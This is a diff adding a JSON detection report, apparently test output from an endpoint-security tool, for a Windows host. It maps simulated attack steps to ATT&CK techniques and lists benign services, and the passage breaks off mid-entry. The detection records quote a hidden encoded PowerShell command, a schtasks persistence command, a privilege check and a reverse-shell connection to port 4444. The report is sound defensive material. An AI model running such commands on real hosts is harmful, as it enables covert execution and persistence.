@@ -1,0 +1,1452 @@
+{
+ "host": {
+  "id": 1,
+  "hostname": "ator-win10-host",
+  "os_type": "windows",
+  "agent_version": "1.0.0-e2e",
+  "enrolled_at_utc": "2026-10-20T02:07:17+00:00",
+  "last_seen_utc": "2026-10-20T02:09:30+00:00"
+ },
+ "risk": {
+  "counts": {
+   "critical": 1,
+   "high": 1,
+   "medium": 1,
+   "low": 1
+  },
+  "score": 39,
+  "verdict": "CONFIRMED COMPROMISE INDICATORS - MULTI-STAGE ATTACK CHAIN",
+  "risk_level": "CRITICAL",
+  "attack_stages_observed": 5
+ },
+ "chain": {
+  "host_id": 1,
+  "chain": [
+   {
+    "tactic": "execution",
+    "display": "Execution",
+    "order": 3,
+    "techniques": [
+     {
+      "id": "T1059.001",
+      "name": "PowerShell",
+      "hits": 1,
+      "times": [
+       "2026-10-20T02:09:30+00:00"
+      ]
+     },
+     {
+      "id": "T1053.005",
+      "name": "Scheduled Task",
+      "hits": 1,
+      "times": [
+       "2026-10-20T02:09:30+00:00"
+      ]
+     }
+    ],
+    "first_seen": "2026-10-20T02:09:30+00:00",
+    "last_seen": "2026-10-20T02:09:30+00:00"
+   },
+   {
+    "tactic": "persistence",
+    "display": "Persistence",
+    "order": 4,
+    "techniques": [
+     {
+      "id": "T1053.005",
+      "name": "Scheduled Task",
+      "hits": 1,
+      "times": [
+       "2026-10-20T02:09:30+00:00"
+      ]
+     }
+    ],
+    "first_seen": "2026-10-20T02:09:30+00:00",
+    "last_seen": "2026-10-20T02:09:30+00:00"
+   },
+   {
+    "tactic": "privilege-escalation",
+    "display": "Privilege Escalation",
+    "order": 5,
+    "techniques": [
+     {
+      "id": "T1053.005",
+      "name": "Scheduled Task",
+      "hits": 1,
+      "times": [
+       "2026-10-20T02:09:30+00:00"
+      ]
+     }
+    ],
+    "first_seen": "2026-10-20T02:09:30+00:00",
+    "last_seen": "2026-10-20T02:09:30+00:00"
+   },
+   {
+    "tactic": "discovery",
+    "display": "Discovery",
+    "order": 8,
+    "techniques": [
+     {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "hits": 1,
+      "times": [
+       "2026-10-20T02:09:30+00:00"
+      ]
+     }
+    ],
+    "first_seen": "2026-10-20T02:09:30+00:00",
+    "last_seen": "2026-10-20T02:09:30+00:00"
+   },
+   {
+    "tactic": "command-and-control",
+    "display": "Command And Control",
+    "order": 11,
+    "techniques": [
+     {
+      "id": "T1071.001",
+      "name": "Web Protocols",
+      "hits": 1,
+      "times": [
+       "2026-10-20T02:09:30+00:00"
+      ]
+     }
+    ],
+    "first_seen": "2026-10-20T02:09:30+00:00",
+    "last_seen": "2026-10-20T02:09:30+00:00"
+   }
+  ],
+  "unplaced": []
+ },
+ "timeline": {
+  "events": [
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "detection",
+    "severity": "low",
+    "title": "[SIGMA] Account Discovery via Whoami",
+    "detail": "{\"technique_id\": \"T1033\", \"summary\": {\"pid\": \"4101\", \"ppid\": \"4100\", \"name\": \"whoami.exe\", \"cmdline\": \"whoami.exe /priv\", \"exe_path\": \"C:\\\\Windows\\\\System32\\\\whoami.exe\"}}",
+    "ref": "detection:6",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "detection",
+    "severity": "medium",
+    "title": "[SIGMA] Scheduled Task Creation via Schtasks",
+    "detail": "{\"technique_id\": \"T1053.005\", \"summary\": {\"pid\": \"4102\", \"ppid\": \"4100\", \"name\": \"schtasks.exe\", \"cmdline\": \"schtasks.exe /create /tn AtorPersist /tr cmd.exe /sc once\", \"exe_path\": \"C:\\\\Windows\\\\System32\\\\schtasks.exe\"}}",
+    "ref": "detection:5",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "detection",
+    "severity": "critical",
+    "title": "[SIGMA] Suspicious Reverse Shell Destination Ports",
+    "detail": "{\"technique_id\": \"T1071.001\", \"summary\": {\"pid\": \"4100\", \"remote_ip\": \"198.51.100.23\", \"remote_port\": \"4444\", \"local_ip\": \"10.0.0.2\", \"local_port\": \"51000\", \"proto\": \"tcp\", \"process_name\": \"powershell.exe\"}}",
+    "ref": "detection:3",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "detection",
+    "severity": "high",
+    "title": "[SIGMA] PowerShell Encoded Command Execution",
+    "detail": "{\"technique_id\": \"T1059.001\", \"summary\": {\"pid\": \"4100\", \"ppid\": \"500\", \"name\": \"powershell.exe\", \"cmdline\": \"powershell.exe -nop -w hidden -enc SQBFAFgAKQAgAA==\", \"exe_path\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}}",
+    "ref": "detection:2",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMSP",
+    "detail": "System32\\drivers\\vmswitch.sys",
+    "ref": "persistence:544",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMSNPXYMP",
+    "detail": "\\SystemRoot\\System32\\drivers\\VmsProxyHNic.sys",
+    "ref": "persistence:543",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmsmp",
+    "detail": "\\SystemRoot\\System32\\drivers\\vmswitch.sys",
+    "ref": "persistence:542",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMnetuserif",
+    "detail": "\\SystemRoot\\system32\\DRIVERS\\vmnetuserif.sys",
+    "ref": "persistence:541",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMnetDHCP",
+    "detail": "C:\\Windows\\SysWOW64\\vmnetdhcp.exe",
+    "ref": "persistence:540",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMnetBridge",
+    "detail": "\\SystemRoot\\system32\\DRIVERS\\vmnetbridge.sys",
+    "ref": "persistence:539",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMnetAdapter",
+    "detail": "\\SystemRoot\\System32\\drivers\\vmnetadapter.sys",
+    "ref": "persistence:538",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmms",
+    "detail": "%systemroot%\\system32\\vmms.exe",
+    "ref": "persistence:537",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmicvss",
+    "detail": "%systemroot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:536",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmicvmsession",
+    "detail": "%systemroot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:535",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmictimesync",
+    "detail": "%systemroot%\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "ref": "persistence:534",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmicshutdown",
+    "detail": "%systemroot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:533",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmicrdv",
+    "detail": "%systemroot%\\system32\\svchost.exe -k ICService -p",
+    "ref": "persistence:532",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmickvpexchange",
+    "detail": "%systemroot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:531",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmicheartbeat",
+    "detail": "%systemroot%\\system32\\svchost.exe -k ICService -p",
+    "ref": "persistence:530",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmicguestinterface",
+    "detail": "%systemroot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:529",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmgid",
+    "detail": "\\SystemRoot\\System32\\drivers\\vmgid.sys",
+    "ref": "persistence:528",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmcompute",
+    "detail": "%systemroot%\\system32\\vmcompute.exe",
+    "ref": "persistence:527",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmbusr",
+    "detail": "\\SystemRoot\\System32\\drivers\\vmbusr.sys",
+    "ref": "persistence:526",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMBusHID",
+    "detail": "\\SystemRoot\\System32\\drivers\\VMBusHID.sys",
+    "ref": "persistence:525",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMAuthdService",
+    "detail": "\"C:\\Program Files (x86)\\VMware\\VMware Workstation\\vmware-authd.exe\"",
+    "ref": "persistence:524",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VirtualRender",
+    "detail": "\\SystemRoot\\System32\\DriverStore\\FileRepository\\vrd.inf_amd64_81fbd405ff2470fc\\vrd.sys",
+    "ref": "persistence:523",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vhf",
+    "detail": "\\SystemRoot\\System32\\drivers\\vhf.sys",
+    "ref": "persistence:522",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vhdparser",
+    "detail": "system32\\drivers\\vhdparser.sys",
+    "ref": "persistence:521",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vhdmp",
+    "detail": "\\SystemRoot\\System32\\drivers\\vhdmp.sys",
+    "ref": "persistence:520",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vds",
+    "detail": "%SystemRoot%\\System32\\vds.exe",
+    "ref": "persistence:519",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VBoxSDS",
+    "detail": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSDS.exe\"",
+    "ref": "persistence:518",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VBoxNetAdp",
+    "detail": "\\SystemRoot\\system32\\DRIVERS\\VBoxNetAdp6.sys",
+    "ref": "persistence:517",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VaultSvc",
+    "detail": "%SystemRoot%\\system32\\lsass.exe",
+    "ref": "persistence:516",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VacSvc",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "ref": "persistence:515",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] UsoSvc",
+    "detail": "%systemroot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:514",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] USER_ESRV_SVC_QUEENCREEK",
+    "detail": "\"C:\\Program Files\\Intel\\SUR\\QUEENCREEK\\x64\\esrv_svc.exe\" \"--run_as_user_process\" ",
+    "ref": "persistence:513",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] UserManager",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:512",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] UserDataSvc_10731d",
+    "detail": "C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup",
+    "ref": "persistence:511",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] UserDataSvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k UnistackSvcGroup",
+    "ref": "persistence:510",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] USBXHCI",
+    "detail": "\\SystemRoot\\System32\\drivers\\USBXHCI.SYS",
+    "ref": "persistence:509",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] usbuhci",
+    "detail": "\\SystemRoot\\System32\\drivers\\usbuhci.sys",
+    "ref": "persistence:508",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] USBSTOR",
+    "detail": "\\SystemRoot\\System32\\drivers\\USBSTOR.SYS",
+    "ref": "persistence:507",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] usbser",
+    "detail": "\\SystemRoot\\System32\\drivers\\usbser.sys",
+    "ref": "persistence:506",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] usbrndis6",
+    "detail": "\\SystemRoot\\System32\\drivers\\usb80236.sys",
+    "ref": "persistence:505",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "collection",
+    "severity": null,
+    "title": "[COLLECTION] artifact snapshot",
+    "detail": "collection_id=win-atk-001 artifacts=6",
+    "ref": "collection:win-atk-001",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "collection",
+    "severity": null,
+    "title": "[COLLECTION] artifact snapshot",
+    "detail": "collection_id=f991d3ac-c496-414b-8943-afd403f89bf8 artifacts=1342",
+    "ref": "collection:f991d3ac-c496-414b-8943-afd403f89bf8",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] XboxNetApiSvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:618",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] XboxGipSvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:617",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] xboxgip",
+    "detail": "\\SystemRoot\\System32\\drivers\\xboxgip.sys",
+    "ref": "persistence:616",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] XblGameSave",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:615",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] XblAuthManager",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:614",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WwanSvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:613",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WUDFWpdMtp",
+    "detail": "\\SystemRoot\\system32\\DRIVERS\\WUDFRd.sys",
+    "ref": "persistence:612",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WUDFWpdFs",
+    "detail": "\\SystemRoot\\System32\\drivers\\WUDFRd.sys",
+    "ref": "persistence:611",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WUDFRd",
+    "detail": "\\SystemRoot\\System32\\drivers\\WUDFRd.sys",
+    "ref": "persistence:610",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WudfPf",
+    "detail": "system32\\drivers\\WudfPf.sys",
+    "ref": "persistence:609",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wuauserv",
+    "detail": "%systemroot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:608",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WSLService",
+    "detail": "\"C:\\Program Files\\WSL\\wslservice.exe\"",
+    "ref": "persistence:607",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wscsvc",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "ref": "persistence:606",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WpnUserService_10731d",
+    "detail": "C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup",
+    "ref": "persistence:605",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WpnUserService",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k UnistackSvcGroup",
+    "ref": "persistence:604",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WpnService",
+    "detail": "%systemroot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:603",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WpdUpFltr",
+    "detail": "System32\\drivers\\WpdUpFltr.sys",
+    "ref": "persistence:602",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WPDBusEnum",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted",
+    "ref": "persistence:601",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WpcMonSvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalService",
+    "ref": "persistence:600",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] workfolderssvc",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k LocalService -p",
+    "ref": "persistence:599",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WMPNetworkSvc",
+    "detail": "\"%PROGRAMFILES%\\Windows Media Player\\wmpnetwk.exe\"",
+    "ref": "persistence:598",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wmiApSrv",
+    "detail": "%systemroot%\\system32\\wbem\\WmiApSrv.exe",
+    "ref": "persistence:597",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WmiAcpi",
+    "detail": "\\SystemRoot\\System32\\drivers\\wmiacpi.sys",
+    "ref": "persistence:596",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WManSvc",
+    "detail": "%systemroot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:595",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wlpasvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "ref": "persistence:594",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wlidsvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:593",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WlanSvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:592",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wisvc",
+    "detail": "%systemroot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:591",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WinVerbs",
+    "detail": "\\SystemRoot\\System32\\drivers\\winverbs.sys",
+    "ref": "persistence:590",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WINUSB",
+    "detail": "\\SystemRoot\\System32\\drivers\\WinUSB.SYS",
+    "ref": "persistence:589",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WinRM",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k NetworkService -p",
+    "ref": "persistence:588",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WinNat",
+    "detail": "system32\\drivers\\winnat.sys",
+    "ref": "persistence:587",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] Winmgmt",
+    "detail": "%systemroot%\\system32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:586",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WinMad",
+    "detail": "\\SystemRoot\\System32\\drivers\\winmad.sys",
+    "ref": "persistence:585",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WinHttpAutoProxySvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "ref": "persistence:584",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WinDefend",
+    "detail": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26090.9-0\\MsMpEng.exe\"",
+    "ref": "persistence:583",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
